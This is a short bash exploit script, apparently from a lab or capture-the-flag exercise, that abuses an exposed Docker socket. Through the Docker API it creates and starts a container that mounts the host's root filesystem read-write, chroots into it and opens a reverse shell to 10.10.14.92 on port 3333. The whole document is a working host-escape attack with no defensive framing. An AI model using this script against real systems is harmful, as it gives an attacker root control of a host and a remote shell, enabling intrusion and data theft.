#!/bin/bash
# Exploits exposed docker.sock to create a container that mounts the host / fs 

cmd="[\"/bin/sh\",\"-c\",\"chroot /tmp sh -c \\\"bash -c 'bash -i >& /dev/tcp/10.10.14.92/3333 0>&1'\\\"\"]"

# https://docs.docker.com/engine/api/v1.24/
curl -s -X POST --unix-socket /var/run/docker.sock -d "{\"Image\":\"sandbox\",\"cmd\":$cmd,\"Binds\": [\"/:/tmp:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create?name=dL1t

curl -s -X POST --unix-socket /var/run/docker.sock "http://localhost/containers/dL1t/start"
